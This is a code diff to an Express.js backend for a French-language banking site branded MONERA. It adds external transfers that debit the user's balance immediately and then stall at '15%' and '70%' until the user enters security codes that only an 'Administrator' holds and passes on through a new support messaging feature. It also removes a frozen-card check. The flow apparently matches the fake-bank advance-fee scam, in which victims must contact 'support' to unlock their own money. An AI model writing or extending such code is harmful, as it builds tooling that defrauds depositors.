@@ -2,7 +2,12 @@ import { Router } from 'express';
 import { z } from 'zod';
 import { getSiteSettings, logAudit, query, withTransaction } from '../config/db.js';
 import { requireAuth, sanitizeUser } from '../middleware/auth.js';
-import { computeLoanSchedule, generateTxReference, roundMoney } from '../utils/banking.js';
+import {
+  computeLoanSchedule,
+  generateTransferSecurityCode,
+  generateTxReference,
+  roundMoney,
+} from '../utils/banking.js';
 
 const router = Router();
 router.use(requireAuth);
@@ -23,6 +28,12 @@ function serializeTransaction(row, currentUserId) {
     recipientName: row.recipient_name || row.recipient_snapshot,
     recipientCode: row.recipient_code || '',
     recipientRib: row.recipient_rib || '',
+    externalBankName: row.external_bank_name || '',
+    externalHolderName: row.external_holder_name || '',
+    externalIban: row.external_iban || '',
+    externalBic: row.external_bic || '',
+    progressPercent: Number(row.progress_percent ?? 100),
+    verificationStep: Number(row.verification_step ?? 3),
     amount: Number(row.amount),
     fee: Number(row.fee || 0),
     currency: row.currency || 'EUR',
@@ -33,9 +44,9 @@ function serializeTransaction(row, currentUserId) {
     adminNote: row.admin_note || '',
     direction: isOutgoing ? 'outgoing' : 'incoming',
     canRequestCancel:
-      row.type === 'transfer' &&
+      (row.type === 'transfer' || row.type === 'external_transfer') &&
       row.sender_id === currentUserId &&
-      (row.status === 'completed' || row.status === 'pending_approval'),
+      ['completed', 'pending_approval', 'awaiting_code_1', 'awaiting_code_2'].includes(row.status),
     createdAt: row.created_at,
     updatedAt: row.updated_at,
   };
@@ -58,6 +69,20 @@ function serializeLoan(row) {
     status: row.status,
     adminNote: row.admin_note || '',
     reviewedAt: row.reviewed_at,
+    createdAt: row.created_at,
+  };
+}
+
+function serializeSupportMessage(row) {
+  return {
+    id: row.id,
+    memberId: row.member_id,
+    senderRole: row.sender_role,
+    content: row.content,
+    attachedCode: row.attached_code || '',
+    txReference: row.tx_reference || '',
+    readByMember: Boolean(row.read_by_member),
+    readByAdmin: Boolean(row.read_by_admin),
     createdAt: row.created_at,
   };
 }
@@ -93,6 +118,11 @@ router.get('/dashboard', async (req, res, next) => {
       [userId]
     );
 
+    const msgRes = await query(
+      'SELECT * FROM support_messages WHERE member_id = $1 ORDER BY created_at ASC LIMIT 200',
+      [userId]
+    );
+
     const contactsRes = await query(
       `SELECT id, full_name, member_code, rib, country
        FROM users
@@ -113,6 +143,8 @@ router.get('/dashboard', async (req, res, next) => {
       }
     }
 
+    const supportMessages = msgRes.rows.map(serializeSupportMessage);
+
     res.json({
       account: sanitizeUser(freshUser),
       transactions,
@@ -125,6 +157,10 @@ router.get('/dashboard', async (req, res, next) => {
         isRead: Boolean(n.is_read),
         createdAt: n.created_at,
       })),
+      supportMessages,
+      unreadSupportCount: supportMessages.filter(
+        (m) => m.senderRole === 'admin' && !m.readByMember
+      ).length,
       directory: contactsRes.rows.map((c) => ({
         id: c.id,
         fullName: c.full_name,
@@ -235,12 +271,6 @@ router.post('/transfers', async (req, res, next) => {
         throw err;
       }
 
-      if (sender.card_frozen && req.body.source === 'card') {
-        const err = new Error('Votre carte virtuelle MONERA est temporairement gelée.');
-        err.statusCode = 403;
-        throw err;
-      }
-
       if (Number(sender.balance) < totalDebit) {
         const err = new Error(
           `Solde insuffisant pour exécuter ce virement (${Number(sender.balance).toLocaleString('fr-FR', { minimumFractionDigits: 2 })} € disponible).`
@@ -302,8 +332,8 @@ router.post('/transfers', async (req, res, next) => {
       const reference = generateTxReference('TXN');
       const txInsert = await tx.query(
         `INSERT INTO transactions
-          (reference, type, sender_id, recipient_id, sender_snapshot, recipient_snapshot, amount, fee, status, credited_to_recipient, description)
-         VALUES ($1, 'transfer', $2, $3, $4, $5, $6, $7, $8, $9, $10)
+          (reference, type, sender_id, recipient_id, sender_snapshot, recipient_snapshot, progress_percent, verification_step, amount, fee, status, credited_to_recipient, description)
+         VALUES ($1, 'transfer', $2, $3, $4, $5, 100, 3, $6, $7, $8, $9, $10)
          RETURNING *`,
         [
           reference,
@@ -344,7 +374,7 @@ router.post('/transfers', async (req, res, next) => {
         client: tx,
         actorId: sender.id,
         actorEmail: sender.email,
-        action: 'TRANSFER_CREATED',
+        action: 'INTERNAL_TRANSFER_CREATED',
         targetType: 'transaction',
         targetId: txInsert.rows[0].id,
         ipAddress: req.ip,
@@ -377,6 +407,264 @@ router.post('/transfers', async (req, res, next) => {
   }
 });
 
+router.post('/external-transfers', async (req, res, next) => {
+  try {
+    const schema = z.object({
+      bankName: z.string().trim().min(2, 'Veuillez sélectionner ou saisir le nom de la banque externe.').max(120),
+      holderName: z.string().trim().min(2, 'Veuillez indiquer le nom du titulaire bénéficiaire.').max(120),
+      iban: z.string().trim().min(8, 'Veuillez saisir un IBAN / numéro de compte bancaire valide.').max(64),
+      bic: z.string().trim().max(24).optional().default(''),
+      amount: z.coerce.number().positive('Le montant doit être strictement positif.'),
+      description: z.string().trim().max(240).optional().default('Virement bancaire externe SEPA/SWIFT'),
+    });
+
+    const parsed = schema.safeParse(req.body);
+    if (!parsed.success) {
+      return res.status(400).json({ error: parsed.error.issues[0].message });
+    }
+
+    const settings = await getSiteSettings();
+    const amount = roundMoney(parsed.data.amount);
+    if (amount > Number(settings.maxTransferAmount || 100000)) {
+      return res.status(400).json({
+        error: `Ce montant dépasse le plafond unitaire autorisé (${Number(settings.maxTransferAmount).toLocaleString('fr-FR')} €).`,
+      });
+    }
+
+    const feePercent = Math.max(0, Number(settings.transferFeePercent || 0));
+    const fee = roundMoney((amount * feePercent) / 100);
+    const totalDebit = roundMoney(amount + fee);
+    const code1 = generateTransferSecurityCode(1);
+
+    const result = await withTransaction(async (tx) => {
+      const senderRes = await tx.query('SELECT * FROM users WHERE id = $1', [req.user.id]);
+      const sender = senderRes.rows[0];
+
+      if (sender.status !== 'active') {
+        const err = new Error('Votre compte est actuellement restreint. Contactez le service client MONERA.');
+        err.statusCode = 403;
+        throw err;
+      }
+
+      if (Number(sender.balance) < totalDebit) {
+        const err = new Error(
+          `Solde insuffisant pour exécuter ce virement externe (${Number(sender.balance).toLocaleString('fr-FR', { minimumFractionDigits: 2 })} € disponible).`
+        );
+        err.statusCode = 400;
+        throw err;
+      }
+
+      const updatedSenderRes = await tx.query(
+        'UPDATE users SET balance = balance - $1, updated_at = NOW() WHERE id = $2 RETURNING *',
+        [totalDebit, sender.id]
+      );
+
+      const reference = generateTxReference('EXT');
+      const recipientLabel = `${parsed.data.bankName} • ${parsed.data.holderName}`;
+
+      const txInsert = await tx.query(
+        `INSERT INTO transactions
+          (reference, type, sender_id, recipient_id, sender_snapshot, recipient_snapshot,
+           external_bank_name, external_holder_name, external_iban, external_bic,
+           progress_percent, verification_step, code_step_1, code_step_2,
+           amount, fee, status, credited_to_recipient, description)
+         VALUES ($1, 'external_transfer', $2, NULL, $3, $4, $5, $6, $7, $8, 15, 1, $9, '', $10, $11, 'awaiting_code_1', FALSE, $12)
+         RETURNING *`,
+        [
+          reference,
+          sender.id,
+          `${sender.full_name} (${sender.member_code})`,
+          recipientLabel,
+          parsed.data.bankName,
+          parsed.data.holderName,
+          parsed.data.iban.toUpperCase(),
+          parsed.data.bic.toUpperCase(),
+          code1,
+          amount,
+          fee,
+          parsed.data.description || `Virement externe vers ${parsed.data.bankName}`,
+        ]
+      );
+
+      await tx.query(
+        `INSERT INTO notifications (user_id, title, message, category)
+         VALUES ($1, 'Virement externe suspendu à 15% — Code requis', $2, 'security')`,
+        [
+          sender.id,
+          `Votre virement ${reference} de ${amount.toFixed(2)} € vers ${parsed.data.bankName} nécessite un code de sécurité interbancaire (palier 15%). Contactez l'Assistance via votre Messagerie.`,
+        ]
+      );
+
+      await logAudit({
+        client: tx,
+        actorId: sender.id,
+        actorEmail: sender.email,
+        action: 'EXTERNAL_TRANSFER_INITIATED_15_PERCENT',
+        targetType: 'transaction',
+        targetId: txInsert.rows[0].id,
+        ipAddress: req.ip,
+        metadata: {
+          reference,
+          amount,
+          bankName: parsed.data.bankName,
+          iban: parsed.data.iban,
+          stage: '15%',
+        },
+      });
+
+      return {
+        transaction: serializeTransaction(txInsert.rows[0], sender.id),
+        account: sanitizeUser(updatedSenderRes.rows[0]),
+      };
+    });
+
+    return res.status(201).json(result);
+  } catch (err) {
+    if (err.statusCode) {
+      return res.status(err.statusCode).json({ error: err.message });
+    }
+    return next(err);
+  }
+});
+
+router.post('/transfers/:id/verify-code', async (req, res, next) => {
+  try {
+    const txId = Number(req.params.id);
+    if (!Number.isInteger(txId) || txId <= 0) {
+      return res.status(400).json({ error: 'Identifiant de virement invalide.' });
+    }
+
+    const schema = z.object({
+      code: z.string().trim().min(3, 'Veuillez saisir le code de validation reçu.').max(32),
+    });
+    const parsed = schema.safeParse(req.body);
+    if (!parsed.success) {
+      return res.status(400).json({ error: parsed.error.issues[0].message });
+    }
+
+    const inputCode = parsed.data.code.replace(/\s+/g, '').toUpperCase();
+
+    const updated = await withTransaction(async (tx) => {
+      const existingRes = await tx.query(
+        'SELECT * FROM transactions WHERE id = $1 AND sender_id = $2',
+        [txId, req.user.id]
+      );
+      if (existingRes.rowCount === 0) {
+        const err = new Error('Virement externe introuvable.');
+        err.statusCode = 404;
+        throw err;
+      }
+
+      const row = existingRes.rows[0];
+      if (row.type !== 'external_transfer') {
+        const err = new Error('Cette opération ne requiert pas de code interbancaire externe.');
+        err.statusCode = 400;
+        throw err;
+      }
+
+      if (row.status === 'awaiting_code_1') {
+        if (inputCode !== row.code_step_1.replace(/\s+/g, '').toUpperCase()) {
+          const err = new Error(
+            "Code de sécurité N°1 invalide. Vérifiez le code transmis par l'Administrateur dans votre Messagerie d'Assistance."
+          );
+          err.statusCode = 400;
+          throw err;
+        }
+
+        const code2 = generateTransferSecurityCode(2);
+        const upRes = await tx.query(
+          `UPDATE transactions
+           SET status = 'awaiting_code_2',
+               progress_percent = 70,
+               verification_step = 2,
+               code_step_2 = $1,
+               updated_at = NOW()
+           WHERE id = $2
+           RETURNING *`,
+          [code2, txId]
+        );
+
+        await tx.query(
+          `INSERT INTO notifications (user_id, title, message, category)
+           VALUES ($1, 'Palier 70% atteint — Second code généré', $2, 'security')`,
+          [
+            req.user.id,
+            `Premier code validé pour ${row.reference}. Le transfert a progressé jusqu'à 70% : un nouveau code final a été transmis à l'Administration. Consultez votre Messagerie d'Assistance.`,
+          ]
+        );
+
+        await logAudit({
+          client: tx,
+          actorId: req.user.id,
+          actorEmail: req.user.email,
+          action: 'EXTERNAL_TRANSFER_ADVANCED_70_PERCENT',
+          targetType: 'transaction',
+          targetId: txId,
+          ipAddress: req.ip,
+          metadata: { reference: row.reference, stage: '70%' },
+        });
+
+        return serializeTransaction(upRes.rows[0], req.user.id);
+      }
+
+      if (row.status === 'awaiting_code_2') {
+        if (inputCode !== row.code_step_2.replace(/\s+/g, '').toUpperCase()) {
+          const err = new Error(
+            "Second code de validation invalide. Veuillez copier le nouveau code envoyé par l'Assistance MONERA."
+          );
+          err.statusCode = 400;
+          throw err;
+        }
+
+        const upRes = await tx.query(
+          `UPDATE transactions
+           SET status = 'completed',
+               progress_percent = 100,
+               verification_step = 3,
+               credited_to_recipient = TRUE,
+               updated_at = NOW()
+           WHERE id = $1
+           RETURNING *`,
+          [txId]
+        );
+
+        await tx.query(
+          `INSERT INTO notifications (user_id, title, message, category)
+           VALUES ($1, 'Virement externe finalisé à 100%', $2, 'transfer')`,
+          [
+            req.user.id,
+            `Votre virement externe ${row.reference} de ${Number(row.amount).toFixed(2)} € vers ${row.external_bank_name} (${row.external_holder_name}) est exécuté à 100%.`,
+          ]
+        );
+
+        await logAudit({
+          client: tx,
+          actorId: req.user.id,
+          actorEmail: req.user.email,
+          action: 'EXTERNAL_TRANSFER_FINALIZED_100_PERCENT',
+          targetType: 'transaction',
+          targetId: txId,
+          ipAddress: req.ip,
+          metadata: { reference: row.reference, stage: '100%', amount: Number(row.amount) },
+        });
+
+        return serializeTransaction(upRes.rows[0], req.user.id);
+      }
+
+      const err = new Error('Ce virement a déjà été finalisé ou annulé.');
+      err.statusCode = 400;
+      throw err;
+    });
+
+    return res.json({ transaction: updated });
+  } catch (err) {
+    if (err.statusCode) {
+      return res.status(err.statusCode).json({ error: err.message });
+    }
+    return next(err);
+  }
+});
+
 router.post('/transfers/:id/cancel', async (req, res, next) => {
   try {
     const txId = Number(req.params.id);
@@ -393,10 +681,7 @@ router.post('/transfers/:id/cancel', async (req, res, next) => {
     }
 
     const updated = await withTransaction(async (tx) => {
-      const existingRes = await tx.query(
-        'SELECT * FROM transactions WHERE id = $1',
-        [txId]
-      );
+      const existingRes = await tx.query('SELECT * FROM transactions WHERE id = $1', [txId]);
       if (existingRes.rowCount === 0) {
         const err = new Error('Transaction introuvable.');
         err.statusCode = 404;
@@ -404,7 +689,10 @@ router.post('/transfers/:id/cancel', async (req, res, next) => {
       }
 
       const row = existingRes.rows[0];
-      if (row.sender_id !== req.user.id || row.type !== 'transfer') {
+      if (
+        row.sender_id !== req.user.id ||
+        (row.type !== 'transfer' && row.type !== 'external_transfer')
+      ) {
         const err = new Error("Seul l'expéditeur du virement peut demander son annulation.");
         err.statusCode = 403;
         throw err;
@@ -458,6 +746,47 @@ router.post('/transfers/:id/cancel', async (req, res, next) => {
     if (err.statusCode) {
       return res.status(err.statusCode).json({ error: err.message });
     }
+    return next(err);
+  }
+});
+
+router.get('/messages', async (req, res, next) => {
+  try {
+    await query(
+      `UPDATE support_messages SET read_by_member = TRUE
+       WHERE member_id = $1 AND sender_role = 'admin' AND read_by_member = FALSE`,
+      [req.user.id]
+    );
+    const { rows } = await query(
+      'SELECT * FROM support_messages WHERE member_id = $1 ORDER BY created_at ASC LIMIT 200',
+      [req.user.id]
+    );
+    res.json({ messages: rows.map(serializeSupportMessage) });
+  } catch (err) {
+    next(err);
+  }
+});
+
+router.post('/messages', async (req, res, next) => {
+  try {
+    const schema = z.object({
+      content: z.string().trim().min(1, 'Veuillez saisir votre message.').max(2000),
+      txReference: z.string().trim().max(36).optional().default(''),
+    });
+    const parsed = schema.safeParse(req.body);
+    if (!parsed.success) {
+      return res.status(400).json({ error: parsed.error.issues[0].message });
+    }
+
+    const ins = await query(
+      `INSERT INTO support_messages (member_id, sender_role, sender_id, content, tx_reference, read_by_member, read_by_admin)
+       VALUES ($1, 'member', $1, $2, $3, TRUE, FALSE)
+       RETURNING *`,
+      [req.user.id, parsed.data.content, parsed.data.txReference]
+    );
+
+    return res.status(201).json({ message: serializeSupportMessage(ins.rows[0]) });
+  } catch (err) {
     return next(err);
   }
 });
